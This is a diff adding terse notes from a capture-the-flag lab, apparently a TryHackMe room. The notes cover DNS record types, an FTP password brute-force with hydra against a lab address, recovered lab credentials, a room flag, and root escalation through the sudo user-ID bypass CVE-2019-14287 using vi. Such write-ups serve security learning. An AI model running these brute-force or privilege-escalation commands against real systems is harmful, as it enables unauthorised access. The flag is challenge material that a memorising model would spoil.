@@ -1,0 +1,41 @@
+
+“If you know the enemy and know yourself, your victory will not stand in doubt.”
+THM{a5b83929888ed36acb0272971e438d78}
+
+Query type	Result
+A	IPv4 Addresses
+AAAA	IPv6 Addresses
+CNAME	Canonical Name
+MX	Mail Servers
+SOA	Start of Authority
+TXT	TXT Records
+
+
+"public dns"  search on duckduckgo
+
+
+
+
+string Hot_Babe.png
+hydra -l ftpuser -P passwd.txt ftp://10.10.98.177
+
+eli
+DSpDiM1wAEwid
+
+s3cr3t --> it contains the user of the device and its passwd for su
+
+
+find / -type f -name user.txt 2> /dev/null  --> here remains the passwords
+
+Brainfuck encoding was also there for the one of file 
+
+
+
+
+
+We need to use “vi” to edit /home/gwendoline/user.txt and type “!/bin/bash” This is a CVE-2019–14287 vulnerability, allowing us to get root access easily
+
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+
+
